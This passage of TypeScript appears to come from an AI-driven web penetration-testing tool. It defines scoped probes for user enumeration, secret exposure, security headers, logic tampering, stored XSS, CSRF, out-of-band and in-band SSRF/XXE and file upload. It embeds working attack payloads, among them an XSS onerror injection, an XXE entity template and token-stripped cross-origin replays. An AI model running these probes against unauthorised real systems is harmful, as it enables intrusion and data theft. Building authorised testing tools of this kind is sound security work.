            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-user-enum",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: stamped,
            note: `user-enum ${tag} user=${user}`,
          });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        try {
          const ctrl = await fire(nobody, "negative_control", "invalid user");
          const p1 = await fire(valid, "positive_replay", "valid user #1");
          const p2 = await fire(valid, "positive_replay", "valid user #2");
          const hit = userEnumMarker(ctrl, p1, p2, valid, nobody);
          const stampedHas = (sample: { status: number; body: string }, marker: string): boolean =>
            sample.body.includes(marker) || `status:${sample.status}` === marker;
          const logic = hit
            ? checkLogicEvidence(
                { status: ctrl.status, hasMarker: stampedHas(ctrl, hit.marker) },
                [p1, p2].map((p) => ({ status: p.status, hasMarker: stampedHas(p, hit.marker) })),
                { requireSuccess: false },
              )
            : ({ ok: false, reason: "no distinguishing marker" } as const);
          return txt(
            JSON.stringify({
              validUser: valid,
              invalidUser: nobody,
              negativeControl: ctrl.evId,
              positiveReplays: [p1.evId, p2.evId],
              ...(hit ? { effectMarker: hit.marker } : {}),
              control: { status: ctrl.status },
              valid: [{ status: p1.status }, { status: p2.status }],
              verdict: hit && logic.ok
                ? `USER ENUMERATION CONFIRMED — ${hit.reason}. record_finding(category user-enumeration) with these evidenceIds + effectMarker.`
                : `not confirmed: ${!hit ? "valid and invalid usernames produced no stable distinguishing marker (generic error / username echo only)." : (logic as { reason: string }).reason}`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_secrets",
      "Confirm a SECRET or INFO DISCLOSURE at `url` (a page, /.env, /actuator/env, a backup, a stack-trace error). GETs a non-existent control path (must be clean) then `url` twice. Hits the impact oracle (keys, private key, .env, passwd) → record_finding(secret-exposure); or phpinfo / directory listing / stack trace → record_finding(info-disclosure). Maps JS keys, Firebase web apiKeys, and reCAPTCHA site keys are public by design — not a hit. robots.txt / sitemap.xml are public files — not info-disclosure. Ambient copies already in the 404 control are ignored. Returns negativeControl + positiveReplays + effectMarker.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        let controlUrl: string;
        try {
          const u = new URL(url);
          controlUrl = new URL(`/verdict-nonexistent-${Date.now().toString(36)}`, u.origin).href;
        } catch {
          return txt("ERROR: url is not absolute");
        }
        if (!isInScope(controlUrl, s.scope)) return txt(`BLOCKED: control path ${controlUrl} out of scope`);
        const fire = async (u: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: "GET", url: u, headers: authHeaders(s), body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-secrets",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `secrets ${tag}`,
          });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        try {
          const ctrl = await fire(controlUrl, "negative_control", "nonexistent path");
          const p1 = await fire(url, "positive_replay", "target #1");
          const p2 = await fire(url, "positive_replay", "target #2");
          const hit = disclosureHit(p1.body, ctrl.body);
          const stable = !!(hit && p2.body.includes(hit.marker));
          const logic = hit && stable
            ? checkLogicEvidence(
                { status: ctrl.status, hasMarker: ctrl.body.includes(hit.marker) },
                [p1, p2].map((p) => ({ status: p.status, hasMarker: p.body.includes(hit.marker) })),
                { requireSuccess: false },
              )
            : ({ ok: false, reason: !hit ? "no secret / info-disclosure signature (and none the control lacked)" : "marker not stable on replay" } as const);
          return txt(
            JSON.stringify({
              negativeControl: ctrl.evId,
              positiveReplays: [p1.evId, p2.evId],
              ...(hit ? { category: hit.category, effectMarker: hit.marker, detail: hit.detail } : {}),
              control: { status: ctrl.status },
              target: [{ status: p1.status }, { status: p2.status }],
              verdict:
                hit && logic.ok
                  ? `${hit.category === "secret-exposure" ? "SECRET EXPOSURE" : "INFO DISCLOSURE"} CONFIRMED — ${hit.detail}. record_finding(category ${hit.category}) with these evidenceIds + effectMarker.`
                  : `not confirmed: ${(logic as { reason: string }).reason}`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_headers",
      "Confirm missing security headers on `url` (CSP, HSTS, X-Frame-Options / frame-ancestors, nosniff, Referrer-Policy, Permissions-Policy) — the same checklist as CLI header-audit. Two GETs; absence is deterministic (no negative-control differential). Returns missing[] + evidenceIds → record_finding(category headers, param=<rule key> e.g. csp). HSTS is skipped on non-TLS. Do not file this as suspected.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const fire = async (kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: "GET", url, headers: authHeaders(s), body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status, { active: false }); // passive hygiene check — does NOT satisfy the coverage gate
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-headers",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `headers ${tag}`,
          });
          return { evId: ev.id, status: res.status, headers: res.headers, body: res.body };
        };
        try {
          const a = await fire("negative_control", "#1");
          const b = await fire("positive_replay", "#2");
          if (looksLikeProxyError(a.body ?? "")) {
            return txt(
              JSON.stringify({
                verdict:
                  "NOT CONFIRMED: the response is an upstream proxy/connection error page (host unreachable through the proxy), NOT the target — the host was never actually reached. Do NOT record header findings on it. Move on (or retry without --burp-proxy).",
              }),
            );
          }
          const lc: Record<string, string> = {};
          for (const [k, v] of Object.entries(a.headers ?? {})) lc[k.toLowerCase()] = v;
          const missing = auditHeaders(lc, url);
          return txt(
            JSON.stringify({
              negativeControl: a.evId,
              positiveReplays: [a.evId, b.evId],
              missing: missing.map((r) => ({ key: r.key, header: r.header, severity: r.severity, title: r.title })),
              verdict:
                missing.length === 0
                  ? "not confirmed: all checked security headers are present (or HSTS n/a on http)."
                  : `MISSING HEADERS — ${missing.map((r) => r.header).join(", ")}. record_finding(category headers, param=<key>) for each, citing these evidenceIds (absence class: no control differential required).`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_logic",
      'Confirm a BUSINESS-LOGIC flaw by differential test: sends a BASELINE (legitimate) request once and a MUTATED (manipulated) request twice, and checks whether the server ACCEPTED the manipulation via `effectMarker` — a string that appears in the response ONLY when the manipulation took effect (e.g. the injected price/total, "role":"admin", an out-of-order step succeeding). Use for price/quantity tampering, mass-assignment (extra role/isAdmin field in the body), workflow/step skipping. Returns evidenceIds (baseline=negativeControl, mutated=positiveReplays) ready for record_finding.',
      {
        baseline: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        mutated: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        effectMarker: z.string(),
        note: z.string().optional(),
      },
      async ({ baseline, mutated, effectMarker, note }) => {
        for (const u of [baseline.url, mutated.url]) if (!isInScope(u, s.scope)) return txt(`BLOCKED: ${u} is out of scope`);
        const mkReq = (r: { method: string; url: string; headers?: Record<string, string>; body?: string | null }): HttpRequest => ({
          method: r.method.toUpperCase(),
          url: r.url,
          headers: { ...authHeaders(s), ...(r.headers ?? {}) },
          body: r.body ?? null,
        });
        const fire = async (req: HttpRequest, kind: "negative_control" | "positive_replay", tag: string) => {
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-logic",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: note ? `${note} (${tag})` : tag,
          });
          return { evId: ev.id, status: res.status, len: res.body.length, hasMarker: res.body.includes(effectMarker) };
        };
        let baseO: Awaited<ReturnType<typeof fire>>;
        let mut1: Awaited<ReturnType<typeof fire>>;
        let mut2: Awaited<ReturnType<typeof fire>>;
        try {
          baseO = await fire(mkReq(baseline), "negative_control", "baseline (legit)");
          mut1 = await fire(mkReq(mutated), "positive_replay", "mutated #1");
          mut2 = await fire(mkReq(mutated), "positive_replay", "mutated #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 150)}`);
        }
        const verdict = checkLogicEvidence(
          { status: baseO.status, hasMarker: baseO.hasMarker },
          [mut1, mut2].map((m) => ({ status: m.status, hasMarker: m.hasMarker })),
        );
        return txt(
          JSON.stringify({
            negativeControl: baseO.evId,
            positiveReplays: [mut1.evId, mut2.evId],
            baseline: { status: baseO.status, len: baseO.len, marker: baseO.hasMarker },
            mutated: [
              { status: mut1.status, len: mut1.len, marker: mut1.hasMarker },
              { status: mut2.status, len: mut2.len, marker: mut2.hasMarker },
            ],
            verdict: verdict.ok ? "MANIPULATION ACCEPTED — record_finding with these evidenceIds + effectMarker" : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_stored_xss",
      "Confirm STORED / cross-context XSS: injects a marker payload at a STORE point (a request that PERSISTS input — comment, profile, filename, ticket, review) then reads it back at a RENDER point to see if it comes back UNESCAPED (or EXECUTES in a browser). The render point can be a DIFFERENT endpoint/screen and can be viewed AS ANOTHER ROLE (`renderAsRole`) to prove cross-user stored XSS (store as the attacker, it fires in a victim/admin view). `store`: {method,url,headers?,body?} with a {{XSS}} placeholder where the input lands. `renderUrl`: where to read it back (GET). Set `renderBrowser:true` to drive a real browser at renderUrl and detect ACTUAL execution (client-rendered stores). Returns negativeControl + positiveReplays evidenceIds + effectMarker, ready for record_finding(category xss-stored).",
      {
        store: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
        renderUrl: z.string(),
        renderBrowser: z.boolean().optional(),
        renderAsRole: z.string().optional(),
      },
      async ({ store, renderUrl, renderBrowser, renderAsRole }) => {
        const tok = `stoX${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        const payload = `"><img src=x onerror="window.__verdict_xss='${tok}'">`;
        const benign = `verdict${tok}safe`;
        const sig = `onerror="window.__verdict_xss='${tok}'"`; // HTTP 反映の確証= 未エスケープのこの片が render に出ること
        const effectMarker = renderBrowser ? tok : sig; // ブラウザ実行なら tok、HTTP 反映なら未エスケープ片
        if (!isInScope(store.url, s.scope) || !isInScope(renderUrl, s.scope)) return txt("BLOCKED: store/render url out of scope");
        // render を別ロールで覗く(cross-user stored XSS の確証)。roleSessions に無ければ現在のセッションのまま。
        let renderHeaders: Record<string, string> = authHeaders(s);
        if (renderAsRole) {
          const live = s.roleSessions?.get(renderAsRole);
          if (live) {
            const ck = await live.driver.sessionCookieHeader().catch(() => live.cookie);
            const bt = await live.driver.bearerToken().catch(() => null);
            renderHeaders = { ...(ck ? { cookie: ck } : {}), ...(bt ? { authorization: `Bearer ${bt}` } : {}) };
          }
        }
        const doStore = async (val: string): Promise<number> => {
          const body = store.body != null ? store.body.replace(/\{\{XSS\}\}/g, val) : null;
          const u = store.url.replace(/\{\{XSS\}\}/g, encodeURIComponent(val));
          const req: HttpRequest = { method: store.method.toUpperCase(), url: u, headers: { ...authHeaders(s), ...(store.headers ?? {}) }, body };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          return res.status;
        };
        const render = async (kind: "negative_control" | "positive_replay", tag: string): Promise<{ evId: string; status: number; has: boolean }> => {
          if (renderBrowser) {
            const r = await s.driver.detectXssExecution(renderUrl, tok);
            const ev = s.evidence.record({
              screenId: s.currentScreenId ?? "pilot",
              validator: "claude-pilot-stored-xss",
              kind,
              request: { method: "GET", url: renderUrl, headers: {}, body: null },
              response: { status: 200, finalUrl: renderUrl, durationMs: 0, headers: { "content-type": "text/html" }, body: r.executed ? `${r.signal} [${tok}]` : r.signal },
              note: `stored-xss browser ${tag}`,
            });
            return { evId: ev.id, status: 200, has: r.executed };
          }
          const req: HttpRequest = { method: "GET", url: renderUrl, headers: renderHeaders, body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-stored-xss",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `stored-xss render ${tag}`,
          });
          return { evId: ev.id, status: res.status, has: res.body.includes(sig) };
        };
        let ctrl: Awaited<ReturnType<typeof render>>;
        let p1: Awaited<ReturnType<typeof render>>;
        let p2: Awaited<ReturnType<typeof render>>;
        try {
          await doStore(benign);
          ctrl = await render("negative_control", "control(benign stored)");
          await doStore(payload);
          p1 = await render("positive_replay", "payload read #1");
          p2 = await render("positive_replay", "payload read #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        const confirmed = !ctrl.has && p1.has && p2.has;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker,
            renderedAs: renderAsRole ?? s.currentRole ?? "current session",
            mode: renderBrowser ? "browser-execution" : "http-reflection",
            control: { fired: ctrl.has },
            payload: [{ fired: p1.has }, { fired: p2.has }],
            verdict: confirmed
              ? `STORED XSS — the payload ${renderBrowser ? "EXECUTED in the browser" : "came back UNESCAPED"} at the render point (control clean)${renderAsRole ? ` viewed as role '${renderAsRole}' (cross-user)` : ""}. record_finding(xss-stored) with these evidenceIds + effectMarker.`
              : "not confirmed: the payload did not persist + fire at the render point (escaped, not stored, or not rendered there).",
          }),
        );
      },
    ),
    tool(
      "probe_csrf",
      "Confirm CSRF on a state-changing request. Only meaningful for COOKIE-based sessions — Bearer/Authorization is NOT auto-sent cross-site, so Bearer-auth endpoints are not CSRF-able (the tool returns not-applicable). Give a request that currently SUCCEEDS with the session ({method,url,headers?,body?}); the tool (1) sends it with NO auth (must FAIL → proves auth is enforced), then (2) sends it with the COOKIE ONLY (no Authorization, like a browser cross-site request), the anti-CSRF token STRIPPED, and a cross-site Origin/Referer — twice; if it still SUCCEEDS, CSRF protection is missing/ineffective. `stripFields`/`stripHeaders` override which token names are removed (defaults cover csrf/_csrf/authenticity_token/X-CSRF-Token/X-Requested-With). Returns negativeControl(no-auth) + positiveReplays(stripped) evidenceIds for record_finding(category csrf). IMPORTANT: also confirm the session cookie is NOT SameSite=Strict/Lax (use analyze_session) — if it is, it is NOT cross-site exploitable.",
      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), stripFields: z.array(z.string()).optional(), stripHeaders: z.array(z.string()).optional() },
      async ({ method, url, headers, body, stripFields, stripHeaders }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} out of scope`);
        if (!s.currentCookie)
          return txt("NOT APPLICABLE: no session cookie — this session is Bearer/none. Browsers don't auto-send Authorization cross-site, so Bearer-auth endpoints are not CSRF-able (CSRF needs a cookie-based session).");
        const fields = (stripFields ?? ["csrf", "_csrf", "csrf_token", "csrftoken", "authenticity_token", "__requestverificationtoken", "xsrf", "_token"]).map((f) => f.toLowerCase());
        const dropHeaders = new Set((stripHeaders ?? ["x-csrf-token", "x-xsrf-token", "x-csrftoken", "x-requested-with", "csrf-token"]).map((h) => h.toLowerCase()));
        const stripBody = (b: string | null): string | null => {
          if (!b) return b;
          const t = b.trim();
          if (t.startsWith("{")) {
            try {
              const o = JSON.parse(t) as Record<string, unknown>;
              for (const k of Object.keys(o)) if (fields.includes(k.toLowerCase())) delete o[k];
              return JSON.stringify(o);
            } catch {
              /* not JSON → form 扱いへ */
            }
          }
          return b.split("&").filter((kv) => !fields.includes((kv.split("=")[0] ?? "").toLowerCase())).join("&");
        };
        const baseHeaders: Record<string, string> = {};
        for (const [k, v] of Object.entries(headers ?? {})) if (!dropHeaders.has(k.toLowerCase())) baseHeaders[k] = v;
        const evil = "https://verdict-csrf.example";
        const crossOrigin = { origin: evil, referer: `${evil}/` };
        const fire = async (hdr: Record<string, string>, bdy: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: method.toUpperCase(), url, headers: hdr, body: bdy };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-csrf", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `csrf ${tag}` });
          return { evId: ev.id, status: res.status };
        };
        let ctrl: Awaited<ReturnType<typeof fire>>;
        let p1: Awaited<ReturnType<typeof fire>>;
        let p2: Awaited<ReturnType<typeof fire>>;
        try {
          // (1) 無認証(cookie も bearer も無し)+ cross-origin → 認証が効いていれば失敗するはず。
          ctrl = await fire({ ...baseHeaders, ...crossOrigin }, body ?? null, "negative_control", "no-auth (must fail)");
          // (2) cookie のみ(Authorization は付けない=ブラウザのクロスサイト相当)+ token 除去 + cross-origin。
          const atkHeaders = { ...baseHeaders, ...crossOrigin, cookie: s.currentCookie };
          const atkBody = stripBody(body ?? null);
          p1 = await fire(atkHeaders, atkBody, "positive_replay", "cookie-only, token-stripped #1");
          p2 = await fire(atkHeaders, atkBody, "positive_replay", "cookie-only, token-stripped #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        const ok2xx = (n: number): boolean => n >= 200 && n < 300;
        const authEnforced = !ok2xx(ctrl.status);
        const csrfWorks = ok2xx(p1.status) && ok2xx(p2.status);
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            noAuth: { status: ctrl.status },
            strippedCookieOnly: [{ status: p1.status }, { status: p2.status }],
            verdict:
              authEnforced && csrfWorks
                ? "LIKELY CSRF — auth IS enforced (no-auth failed) yet the cookie-only, token-stripped, cross-origin request SUCCEEDED twice. Before record_finding(csrf): confirm the session cookie is NOT SameSite=Strict/Lax (analyze_session) — only then is it cross-site exploitable."
                : !authEnforced
                  ? "not confirmed: the no-auth request also succeeded — this endpoint isn't auth-gated (not CSRF; treat as access-control / missing-auth instead)."
                  : "not confirmed: the token-stripped / cross-origin request did NOT succeed — CSRF protection appears present.",
          }),
        );
      },
    ),
    tool(
      "probe_oob",
      "Confirm a BLIND / out-of-band vuln via Interactsh or Burp Collaborator: blind SSRF, blind XXE, blind SQLi (DNS/HTTP exfil), OS command injection, header SSRF (X-Forwarded-Host / Referer / Host), email/webhook SSRF — anything where the EFFECT is the SERVER making an external request, not a visible response. Requires OOB enabled (Settings → OOB → Interactsh, or BURP_AUDIT_API + Collaborator). Put a {{OOB}} placeholder where the callback host belongs (a URL field, an XXE SYSTEM entity `<!ENTITY x SYSTEM \"http://{{OOB}}/\">`, a hostname, a header value, OR inside an uploaded file's text content — see `files`). The tool generates a unique callback host, injects it (in-scope target request), and polls ~waitSec for a DNS/HTTP/SMTP callback FROM the target; a callback = the server reached our host out-of-band = confirmed. FILE-BORNE OOB: for a blind SSRF/XXE that must live INSIDE an uploaded file (FFmpeg/HLS video-SSRF, ImageMagick, an uploaded SVG/DOCX with a SYSTEM entity), pass `files` (each {name, filename, contentType?, and `content` text OR `base64` bytes}) with {{OOB}} in a file's text `content` — it is sent as multipart/form-data and the callback confirms the file-borne case. Records a benign control + the injected request → negativeControl + positiveReplays evidenceIds for record_finding(category ssrf / rce as appropriate). NOTE: callbacks can lag seconds; nothing back after waitSec = not confirmed (try other params/headers/schemes).",
      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), files: z.array(z.object({ name: z.string(), filename: z.string(), contentType: z.string().optional(), content: z.string().optional(), base64: z.string().optional() })).optional(), waitSec: z.number().optional(), note: z.string().optional() },
      async ({ method, url, headers, body, files, waitSec, note }) => {
        if (!s.oob) return txt("OOB NOT AVAILABLE: enable OOB in Settings (Interactsh) or set BURP_AUDIT_API (Burp Collaborator). Without it, blind SSRF/XXE/SQLi cannot be confirmed out-of-band. In-band probe_ssrf still applies.");
        const oob = s.oob;
        const inPlaceholder = url.includes("{{OOB}}") || (body?.includes("{{OOB}}") ?? false) || Object.values(headers ?? {}).some((v) => v.includes("{{OOB}}")) || filesHaveOobPlaceholder(files, "{{OOB}}");
        if (!inPlaceholder) return txt("ERROR: put a {{OOB}} placeholder where the callback host should be injected (in url, body, a header value, or an uploaded file's text content via `files`).");
        let payload: { host: string; id: string };
        try {
          payload = await oob.payload();
        } catch (e) {
          return txt(`OOB error: ${String(e).slice(0, 160)} (is Interactsh reachable, or Collaborator enabled in Burp?)`);
        }
        const startTs = Date.now();
        const sub = (v: string, host: string): string => v.replace(/\{\{OOB\}\}/g, host);
        const inject = async (host: string, kind: "negative_control" | "positive_replay", resultBody: string): Promise<string> => {
          const u = sub(url, host);
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const hdr: Record<string, string> = {};
          for (const [k, v] of Object.entries(headers ?? {})) hdr[k] = sub(v, host);
          const req: HttpRequest = { method: method.toUpperCase(), url: u, headers: { ...authHeaders(s), ...hdr }, body: body != null ? sub(body, host) : null };
          // File-borne OOB: substitute the callback host into each file's text content and send as multipart (body is
          // then ignored by the sender). This is what makes blind file-SSRF / uploaded-SVG XXE confirmable, not just suspected.
          if (files && files.length) req.multipart = oobFilesToMultipart(files, (v) => sub(v, host));
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          // 証拠の body は OOB の結果(マーカー= collaborator host)に差し替える。ブラインドなので HTTP 応答自体は無意味。
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-oob",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: { ...res, body: `[VERDICT-OOB] ${resultBody}` },
            note: note ? `${note} (oob)` : "oob",
          });
          return ev.id;
        };
        let controlEv: string;
        try {
          // negative control: コールバックしない良性ホストを注入(interaction が出ないこと)。
          controlEv = await inject(`verdict-oob-noref-${payload.id.slice(0, 8)}.invalid`, "negative_control", "control: benign host, no callback expected");
          // 本注入: OOB host を埋めて送信。
          await inject(payload.host, "positive_replay", `injected OOB host ${payload.host} (id ${payload.id}); polling for callback…`);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 160)}`);
        }
        // コールバックは非同期(秒〜)。即ポーリングしてから waitSec まで数秒おきに。
        const budgetMs = Math.min(Math.max(waitSec ?? 20, 1), 45) * 1000;
        const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        let hits: Awaited<ReturnType<typeof oob.poll>> = [];
        let lastPollErr = "";
        const t0 = Date.now();
        while (Date.now() - t0 < budgetMs) {
          try {
            hits = await oob.poll({ since: startTs, id: payload.id });
            lastPollErr = "";
          } catch (e) {
            lastPollErr = String(e instanceof Error ? e.message : e).slice(0, 160);
          }
          if (hits.length > 0) break;
          const remain = budgetMs - (Date.now() - t0);
          if (remain <= 0) break;
          await sleep(Math.min(3000, remain));
        }
        const confirmed = hits.length > 0;
        const summary = confirmed ? hits.map((h) => `${h.type}@${new Date(h.time).toISOString()}${h.clientIp ? ` from ${h.clientIp}` : ""}`).join("; ") : `no callback within ${Math.round(budgetMs / 1000)}s`;
        // positiveReplays ×2: 確証結果(マーカー= host)を 2 件記録 → record_finding の証拠規律(>=2 安定 positive)に乗せる。
        // positive の evidence body は **固定の長文(host 込み)** にする。ssrf/rce は非マーカー判定(checkEvidenceDiscipline)で
        // control との body 長差 >64 が要るため、confirmed 時は control より常時十分長くなるようにして取りこぼしを防ぐ。
        const resBody = confirmed
          ? `OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external ${hits.map((h) => h.type).join("/")} request to our unique OOB host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). oob_host=${payload.host} payload_id=${payload.id} provider=${oob.kind} interactions=[${summary}]`
          : `no out-of-band callback within ${Math.round(budgetMs / 1000)}s for ${payload.host}`;
        const p1 = await inject(payload.host, "positive_replay", `${resBody} [read#1]`).catch(() => "");
        const p2 = await inject(payload.host, "positive_replay", `${resBody} [read#2]`).catch(() => "");
        return txt(
          JSON.stringify({
            negativeControl: controlEv,
            positiveReplays: [p1, p2].filter(Boolean),
            effectMarker: payload.host,
            oobHost: payload.host,
            collaboratorHost: payload.host,
            provider: oob.kind,
            interactions: hits,
            verdict: confirmed
              ? `OOB CONFIRMED — the target made ${hits.length} out-of-band ${hits.map((h) => h.type).join("/")} request(s) to our callback host. record_finding(ssrf / rce / xxe as fits the sink) with these evidenceIds + effectMarker (the callback host).`
              : lastPollErr
                ? `not confirmed: OOB poll error (${lastPollErr}). The callback channel may be misconfigured — check Settings → OOB / Interactsh reachability, or BURP_AUDIT_API.`
                : `not confirmed: no OOB callback within ${Math.round(budgetMs / 1000)}s. The sink may be filtered, the response not blind, or the callback slow — try another param/header (X-Forwarded-Host, Referer), scheme (http/dns/gopher), or a longer waitSec.`,
          }),
        );
      },
    ),
    tool(
      "probe_ssrf",
      "Confirm IN-BAND SSRF (no Collaborator): a URL/hostname sink where the SERVER fetches the value and the RESPONSE carries the fetched content (cloud metadata, /etc/passwd, internal admin). Put {{SSRF}} in `url` or `body`, or pass `param` (query). Sends a reserved .invalid control (must be clean) then cloud-IMDS / file:// / loopback payloads; confirms when a metadata/passwd marker appears only on the payload, twice. record_finding(category ssrf) with effectMarker. If the response is BLIND (no content differential), use probe_oob instead.",
      {
        url: z.string(),
        param: z.string().optional(),
        method: z.string().optional(),
        body: z.string().nullable().optional(),
      },
      async ({ url, param, method, body }) => {
        if (!placeSsrfTarget(url, body ?? null, param, SSRF_CONTROL)) {
          return txt("ERROR: put {{SSRF}} in url or body, or pass a query `param` (the URL/host the server fetches).");
        }
        const meth = (method ?? (body != null ? "POST" : "GET")).toUpperCase();
        const fire = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const p = placeSsrfTarget(url, body ?? null, param, val)!;
          if (!isInScope(p.url, s.scope)) throw new Error(`out of scope: ${p.url}`);
          const hdr: Record<string, string> = { ...authHeaders(s) };
          if (p.body != null) {
            const t = p.body.trim();
            hdr["content-type"] = t.startsWith("{") || t.startsWith("[") ? "application/json" : "application/x-www-form-urlencoded";
          }
          const req: HttpRequest = { method: meth, url: p.url, headers: hdr, body: p.body };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-ssrf",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `ssrf ${tag}`,
          });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        try {
          const ctrl = await fire(SSRF_CONTROL, "negative_control", "control(.invalid host)");
          const tried: string[] = [];
          for (const payload of SSRF_PAYLOADS) {
            tried.push(payload);
            const p1 = await fire(payload, "positive_replay", `${payload} #1`);
            const hit = ssrfHit(p1.body, ctrl.body, payload);
            if (!hit) continue;
            const p2 = await fire(payload, "positive_replay", `${payload} #2`);
            if (!p2.body.includes(hit.marker)) continue;
            const logic = checkLogicEvidence(
              { status: ctrl.status, hasMarker: ctrl.body.includes(hit.marker) },
              [p1, p2].map((p) => ({ status: p.status, hasMarker: p.body.includes(hit.marker) })),
              { requireSuccess: false },
            );
            if (!logic.ok) continue;
            return txt(
              JSON.stringify({
                technique: payload,
                negativeControl: ctrl.evId,
                positiveReplays: [p1.evId, p2.evId],
                effectMarker: hit.marker,
                detail: hit.detail,
                control: { status: ctrl.status },
                payload: [{ status: p1.status }, { status: p2.status }],
                verdict: `IN-BAND SSRF CONFIRMED — ${hit.detail} (payload ${payload}). record_finding(category ssrf) with these evidenceIds + effectMarker.`,
              }),
            );
          }
          return txt(
            JSON.stringify({
              tried,
              negativeControl: ctrl.evId,
              control: { status: ctrl.status },
              verdict: "not confirmed: no metadata / file / internal-content marker vs the .invalid control. If the sink is BLIND, use probe_oob.",
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_upload",
      "Confirm a FILE UPLOAD vuln — an HTTP 200 accept is NOT a finding. Uploads a benign control SVG, then a unique-marker XSS SVG, then (if needed) an XXE SVG; extracts a fetch URL from the upload response (JSON url/path/href, Location, HTML href/src) and GETs it (in-scope only). Confirms when the fetched body (or the upload body) carries the XSS marker in a live HTML position, or /etc/passwd / win.ini from XXE, absent from the control. record_finding(xss-stored or xxe) with effectMarker. Webshell RCE is out of scope here.",
      {
        url: z.string(),
        field: z.string().optional(),
        method: z.string().optional(),
        fields: z.record(z.string()).optional(),
      },
      async ({ url, field, method, fields }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const fileField = (field?.trim() || "file").trim();
        const meth = (method ?? "POST").toUpperCase();
        const tok = `vXss${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        type Up = { evId: string; status: number; body: string; headers: Record<string, string>; urls: string[] };
        const upload = async (filename: string, content: string, kind: "negative_control" | "positive_replay", tag: string): Promise<Up> => {
          const req: HttpRequest = {
            method: meth,
            url,
            headers: authHeaders(s),
            body: null,
            multipart: {
              ...(fields ? { fields } : {}),
              files: [{ name: fileField, filename, contentType: "image/svg+xml", base64: Buffer.from(content, "utf8").toString("base64") }],
            },
          };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const evBody = `[multipart] ${filename}\n${content.slice(0, 400)}`;
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-upload",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody },
            response: res,
            note: `upload ${tag}`,
          });
